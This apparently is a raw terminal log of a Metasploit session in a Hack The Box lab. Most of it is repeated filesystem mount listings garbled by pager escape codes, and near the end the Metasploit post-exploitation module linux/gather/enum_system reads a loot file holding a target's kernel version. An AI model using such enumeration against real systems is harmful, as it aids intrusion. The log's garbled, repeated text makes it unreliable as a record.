+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/systemd
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/cpu,cpuacct
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/pids
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/perf_event
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/net_cls,net_prio
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/rdma
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/freezer
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/memory
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/devices
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/blkio
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/cpuset
+:[K[K [KESCESC[KOO[KBB[Kpstore         pstore          0     0     0    - /sys/fs/pstore
+:[K[K [KESCESC[KOO[KBB[Knone           bpf             0     0     0    - /sys/fs/bpf
+:[K[K [KESCESC[KOO[KBB[Kdebugfs        debugfs         0     0     0    - /sys/kernel/debug
+:[K[K [KESCESC[KOO[KBB[Ktracefs        tracefs         0     0     0    - /sys/kernel/tracing
+:[K[K [KESCESC[KOO[KBB[Kproc           proc            0     0     0    - /proc
+:[K[K [KESCESC[KOO[KBB[Ksystemd-1      -               -     -     -    - /proc/sys/fs/binfmt_misc
+:[K[K [KESCESC[KOO[KBB[Kbinfmt_misc    binfmt_misc     0     0     0    - /proc/sys/fs/binfmt_misc
+:[K[K [KESCESC[KOO[KBB[Khackthebox.eu  vboxsf       632G  581G   52G  92% /mnt/shared
+:[K[K [KESCESC[KOO[KBB[K/dev/sda1      ext4          19G   13G  4.3G  76% /tmp
+:[K[K [KESCESC[KOO[KBB[K/dev/sda1      ext4          19G   13G  4.3G  76% /var/tmp
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs         99M   32K   99M   1% /run/user/130
+:[K[K [KESCESC[KOO[KBB[Kfusectl        fusectl         0     0     0    - /sys/fs/fuse/connections
+:[K[K [KESCESC[KOO[KBB[Kgvfsd-fuse     -               -     -     -    - /run/user/130/gvfs
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs         99M  8.0K   99M   1% /run/user/1000
+:[K[K [KESCESC[KOO[KBB[Kgvfsd-fuse     -               -     -     -    - /run/user/1000/gvfs
+[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[HMhugetlbfs      hugetlbfs       0     0     0    - /dev/hugepages
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMmqueue         mqueue          0     0     0    - /dev/mqueue
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtmpfs          tmpfs        493M     0  493M   0% /dev/shm
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMdevpts         devpts          0     0     0    - /dev/pts
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMudev           devtmpfs     464M     0  464M   0% /dev
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM/dev/sda1      ext4          19G   13G  4.3G  76% /
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMFilesystem     Type         Size  Used Avail Use% Mounted on
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMgvfsd-fuse on /run/user/1000/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=1000,group_id=1000)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=100896k,mode=700,uid=1000,gid=1000)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMgvfsd-fuse on /run/user/130/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=130,group_id=139)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMfusectl on /sys/fs/fuse/connections type fusectl (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtmpfs on /run/user/130 type tmpfs (rw,nosuid,nodev,relatime,size=100896k,mode=700,uid=130,gid=139)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM/dev/sda1 on /var/tmp type ext4 (rw,relatime,errors=remount-ro)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM/dev/sda1 on /tmp type ext4 (rw,relatime,errors=remount-ro)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMhackthebox.eu on /mnt/shared type vboxsf (rw,nodev,relatime,iocharset=utf8,uid=0,gid=140,dmode=0770,fmode=0770,tag=VBoxAutomounter)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMbinfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMsystemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=12139)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMproc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtracefs on /sys/kernel/tracing type tracefs (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMdebugfs on /sys/kernel/debug type debugfs (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMnone on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMpstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMcgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMsecurityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMsysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMsunrpc on /run/rpc_pipefs type rpc_pipefs (rw,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=100900k,mode=755)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMhugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMmqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMdevpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMudev on /dev type devtmpfs (rw,nosuid,noexec,relatime,size=474132k,nr_inodes=118533,mode=755)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KBB[K/dev/sda1 on /var/tmp type ext4 (rw,relatime,errors=remount-ro)
+:[K[K [KESCESC[KOO[KBB[Ktmpfs on /run/user/130 type tmpfs (rw,nosuid,nodev,relatime,size=100896k,mode=700,uid=130,gid=139)
+:[K[K [KESCESC[KOO[KBB[Kfusectl on /sys/fs/fuse/connections type fusectl (rw,nosuid,nodev,noexec,relatime)
+:[K[K [KESCESC[KOO[KBB[Kgvfsd-fuse on /run/user/130/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=130,group_id=139)
+:[K[K [KESCESC[KOO[KBB[Ktmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=100896k,mode=700,uid=1000,gid=1000)
+:[K[K [KESCESC[KOO[KBB[Kgvfsd-fuse on /run/user/1000/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=1000,group_id=1000)
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[KFilesystem     Type         Size  Used Avail Use% Mounted on
+:[K[K [KESCESC[KOO[KBB[K/dev/sda1      ext4          19G   13G  4.3G  76% /
+:[K[K [KESCESC[KOO[KBB[Kudev           devtmpfs     464M     0  464M   0% /dev
+:[K[K [KESCESC[KOO[KBB[Kdevpts         devpts          0     0     0    - /dev/pts
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs        493M     0  493M   0% /dev/shm
+:[K[K [KESCESC[KOO[KBB[Kmqueue         mqueue          0     0     0    - /dev/mqueue
+:[K[K [KESCESC[KOO[KBB[Khugetlbfs      hugetlbfs       0     0     0    - /dev/hugepages
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs         99M  1.1M   98M   2% /run
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs        5.0M     0  5.0M   0% /run/lock
+:[K[K [KESCESC[KOO[KBB[Ksunrpc         rpc_pipefs      0     0     0    - /run/rpc_pipefs
+:[K[K [KESCESC[KOO[KBB[Ksysfs          sysfs           0     0     0    - /sys
+:[K[K [KESCESC[KOO[KBB[Ksecurityfs     securityfs      0     0     0    - /sys/kernel/security
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs        493M     0  493M   0% /sys/fs/cgroup
+:[K[K [KESCESC[KOO[KBB[Kcgroup2        cgroup2         0     0     0    - /sys/fs/cgroup/unified
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/systemd
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/cpu,cpuacct
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/pids
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/perf_event
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/net_cls,net_prio
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/rdma
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/freezer
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/memory
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/devices
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/blkio
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/cpuset
+:[K[K [KESCESC[KOO[KBB[Kpstore         pstore          0     0     0    - /sys/fs/pstore
+:[K[K [KESCESC[KOO[KBB[Knone           bpf             0     0     0    - /sys/fs/bpf
+:[K[K [KESCESC[KOO[KBB[Kdebugfs        debugfs         0     0     0    - /sys/kernel/debug
+:[K[K [KESCESC[KOO[KBB[Ktracefs        tracefs         0     0     0    - /sys/kernel/tracing
+:[K[K [KESCESC[KOO[KBB[Kproc           proc            0     0     0    - /proc
+:[K[K [KESCESC[KOO[KBB[Ksystemd-1      -               -     -     -    - /proc/sys/fs/binfmt_misc
+:[K[K [KESCESC[KOO[KBB[Kbinfmt_misc    binfmt_misc     0     0     0    - /proc/sys/fs/binfmt_misc
+:[K[K [KESCESC[KOO[KBB[Khackthebox.eu  vboxsf       632G  581G   52G  92% /mnt/shared
+:[K[K [KESCESC[KOO[KBB[K/dev/sda1      ext4          19G   13G  4.3G  76% /tmp
+:[K[K [KESCESC[KOO[KBB[K/dev/sda1      ext4          19G   13G  4.3G  76% /var/tmp
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs         99M   32K   99M   1% /run/user/130
+:[K[K [KESCESC[KOO[KBB[Kfusectl        fusectl         0     0     0    - /sys/fs/fuse/connections
+:[K[K [KESCESC[KOO[KBB[Kgvfsd-fuse     -               -     -     -    - /run/user/130/gvfs
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs         99M  8.0K   99M   1% /run/user/1000
+:[K[K [KESCESC[KOO[KBB[Kgvfsd-fuse     -               -     -     -    - /run/user/1000/gvfs
+[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[HMhugetlbfs      hugetlbfs       0     0     0    - /dev/hugepages
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMmqueue         mqueue          0     0     0    - /dev/mqueue
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtmpfs          tmpfs        493M     0  493M   0% /dev/shm
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMdevpts         devpts          0     0     0    - /dev/pts
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMudev           devtmpfs     464M     0  464M   0% /dev
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM/dev/sda1      ext4          19G   13G  4.3G  76% /
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMFilesystem     Type         Size  Used Avail Use% Mounted on
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMgvfsd-fuse on /run/user/1000/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=1000,group_id=1000)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=100896k,mode=700,uid=1000,gid=1000)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMgvfsd-fuse on /run/user/130/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=130,group_id=139)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMfusectl on /sys/fs/fuse/connections type fusectl (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtmpfs on /run/user/130 type tmpfs (rw,nosuid,nodev,relatime,size=100896k,mode=700,uid=130,gid=139)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM/dev/sda1 on /var/tmp type ext4 (rw,relatime,errors=remount-ro)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM/dev/sda1 on /tmp type ext4 (rw,relatime,errors=remount-ro)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMhackthebox.eu on /mnt/shared type vboxsf (rw,nodev,relatime,iocharset=utf8,uid=0,gid=140,dmode=0770,fmode=0770,tag=VBoxAutomounter)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMbinfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMsystemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=12139)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMproc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HMtracefs on /sys/kernel/tracing type tracefs (rw,nosuid,nodev,noexec,relatime)
+[34;1H[K:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/freezer
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/memory
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/devices
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/blkio
+:[K[K [KESCESC[KOO[KBB[Kcgroup         cgroup          0     0     0    - /sys/fs/cgroup/cpuset
+:[K[K [KESCESC[KOO[KBB[Kpstore         pstore          0     0     0    - /sys/fs/pstore
+:[K[K [KESCESC[KOO[KBB[Knone           bpf             0     0     0    - /sys/fs/bpf
+:[K[K [KESCESC[KOO[KBB[Kdebugfs        debugfs         0     0     0    - /sys/kernel/debug
+:[K[K [KESCESC[KOO[KBB[Ktracefs        tracefs         0     0     0    - /sys/kernel/tracing
+:[K[K [KESCESC[KOO[KBB[Kproc           proc            0     0     0    - /proc
+:[K[K [KESCESC[KOO[KBB[Ksystemd-1      -               -     -     -    - /proc/sys/fs/binfmt_misc
+:[K[K [KESCESC[KOO[KBB[Kbinfmt_misc    binfmt_misc     0     0     0    - /proc/sys/fs/binfmt_misc
+:[K[K [KESCESC[KOO[KBB[Khackthebox.eu  vboxsf       632G  581G   52G  92% /mnt/shared
+:[K[K [KESCESC[KOO[KBB[K/dev/sda1      ext4          19G   13G  4.3G  76% /tmp
+:[K[K [KESCESC[KOO[KBB[K/dev/sda1      ext4          19G   13G  4.3G  76% /var/tmp
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs         99M   32K   99M   1% /run/user/130
+:[K[K [KESCESC[KOO[KBB[Kfusectl        fusectl         0     0     0    - /sys/fs/fuse/connections
+:[K[K [KESCESC[KOO[KBB[Kgvfsd-fuse     -               -     -     -    - /run/user/130/gvfs
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs         99M  8.0K   99M   1% /run/user/1000
+:[K[K [KESCESC[KOO[KBB[Kgvfsd-fuse     -               -     -     -    - /run/user/1000/gvfs
+[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> less /home/dinesh/.msf4/loot/20200904212050_default_10.10.10.8_linux.version_136000.txt
+[0m[1m[34m[*][0m exec: less /home/dinesh/.msf4/loot/20200904212050_default_10.10.10.8_linux.version_136000.txt
+
+[?1049h[22;0;0t[?1h=Distro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[7m/home/dinesh/.msf4/loot/20200904212050_default_10.10.10.8_linux.version_136000.txt (END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+Distro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
